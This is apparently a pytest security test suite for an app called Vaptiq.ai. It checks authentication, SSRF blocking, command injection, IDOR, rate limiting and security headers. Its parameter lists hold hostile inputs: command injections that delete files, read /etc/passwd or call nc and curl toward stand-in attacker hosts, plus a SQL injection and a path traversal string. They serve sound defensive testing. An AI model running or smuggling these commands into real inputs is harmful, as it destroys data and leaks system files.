"""
Security Test Suite for Vaptiq.ai
Tests authentication, authorization, SSRF, command injection, and IDOR protection
"""
import pytest
import httpx
from fastapi.testclient import TestClient
import os

# Test configuration
TEST_API_URL = os.getenv("TEST_API_URL", "http://localhost:8000")
TEST_JWT_SECRET = "test-secret-key-minimum-32-characters-long-for-testing"

# Mock JWT token for testing
VALID_TOKEN = "Bearer mock-valid-token"
INVALID_TOKEN = "Bearer invalid-token"


@pytest.fixture
def client():
    """Fixture for test client"""
    from main import app
    return TestClient(app)


class TestAuthentication:
    """Test JWT authentication security"""
    
    def test_missing_jwt_secret_fails_startup(self):
        """CRITICAL-001: Application should fail if JWT secret is missing"""
        # This would be tested at the module import level
        # Auth.py raises ValueError on import if secret is missing
        pass
    
    def test_unauthenticated_access_denied(self, client):
        """CRITICAL-002: Unauthenticated requests should be denied"""
        endpoints_requiring_auth = [
            "/scans",
            "/scan/test-id",
            "/scan/test-id/export",
            "/targets/create",
        ]
        
        for endpoint in endpoints_requiring_auth:
            response = client.get(endpoint)
            assert response.status_code == 401, f"Endpoint {endpoint} should require authentication"
    
    def test_invalid_token_rejected(self, client):
        """Tokens with invalid signatures should be rejected"""
        response = client.get(
            "/scans",
            headers={"Authorization": INVALID_TOKEN}
        )
        assert response.status_code == 401


class TestSSRFProtection:
    """Test SSRF protection in scanning functionality"""
    
    @pytest.mark.parametrize("target,expected_block", [
        ("192.168.1.1", True),  # Private IP
        ("10.0.0.1", True),  # Private IP
        ("172.16.0.1", True),  # Private IP
        ("127.0.0.1", True),  # Localhost
        ("169.254.169.254", True),  # AWS metadata
        ("8.8.8.8", False),  # Public IP (allowed)
    ])
    def test_ssrf_protection_blocks_private_ips(self, client, target, expected_block):
        """HIGH SSRF: Should block scanning of private IP addresses"""
        response = client.post(
            "/scan",
            json={"type": "IP", "value": target},
            headers={"Authorization": VALID_TOKEN}
        )
        
        if expected_block:
            assert response.status_code in [400, 403], f"Should block private IP: {target}"
        else:
            # Public IPs might still fail with 401 if token is mock
            assert response.status_code in [200, 401]


class TestCommandInjection:
    """Test command injection prevention"""
    
    @pytest.mark.parametrize("malicious_input", [
        "example.com; rm -rf /",
        "example.com && cat /etc/passwd",
        "example.com | nc attacker.com 1337",
        "$(curl http://evil.com)",
        "`whoami`",
    ])
    def test_command_injection_blocked(self, client, malicious_input):
        """CRITICAL-009: Command injection attempts should be blocked"""
        response = client.post(
            "/scan",
            json={"type": "URL", "value": malicious_input},
            headers={"Authorization": VALID_TOKEN}
        )
        
        # Should return 400 Bad Request due to invalid characters
        assert response.status_code in [400, 401]


class TestIDORProtection:
    """Test Insecure Direct Object Reference protection"""
    
    def test_cannot_access_other_users_scans(self, client):
        """Users should not be able to access other users' scans"""
        # This requires creating two users and testing cross-access
        # Mock implementation - would need full test setup
        response = client.get(
            "/scan/other-user-scan-id",
            headers={"Authorization": VALID_TOKEN}
        )
        
        # Should return 403 Forbidden or 404 Not Found
        assert response.status_code in [403, 404, 401]
    
    def test_admin_can_access_all_scans(self):
        """Admin users should be able to access all scans"""
        # Would require admin token
        pass


class TestRateLimiting:
    """Test API rate limiting"""
    
    def test_rate_limit_enforced(self, client):
        """MEDIUM-014: Rate limits should be enforced"""
        # Make 65 requests (limit is 60/minute)
        responses = []
        for i in range(65):
            response = client.get(
                "/scans",
                headers={"Authorization": VALID_TOKEN}
            )
            responses.append(response)
        
        # At least one should be rate limited (429 Too Many Requests)
        status_codes = [r.status_code for r in responses]
        assert 429 in status_codes, "Rate limiting should  trigger after 60 requests"


class TestInputValidation:
    """Test UUID and input validation"""
    
    @pytest.mark.parametrize("invalid_uuid", [
        "not-a-uuid",
        "123",
        "'; DROP TABLE scans; --",
        "../../../etc/passwd",
    ])
    def test_invalid_uuid_rejected(self, client, invalid_uuid):
        """UUIDs should be validated before processing"""
        response = client.get(
            f"/scan/{invalid_uuid}",
            headers={"Authorization": VALID_TOKEN}
        )
        
        assert response.status_code == 400, "Invalid UUID should return 400 Bad Request"


class TestHTTPSEnforcement:
    """Test HTTPS enforcement in production"""
    
    def test_http_origins_rejected_in_production(self):
        """HIGH-005: HTTP origins should be rejected in production mode"""
        # This is tested at startup, not runtime
        # Would require setting ENVIRONMENT=production and testing
        pass


class TestSecurityHeaders:
    """Test security headers presence"""
    
    def test_security_headers_present(self, client):
        """MEDIUM-017: Security headers should be present in all responses"""
        response = client.get("/")
        
        expected_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy",
        ]
        
        for header in expected_headers:
            assert header in response.headers, f"Missing security header: {header}"
    
    def test_server_header_removed(self, client):
        """Server identification header should be removed"""
        response = client.get("/")
        assert "Server" not in response.headers or response.headers.get("Server") == ""


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
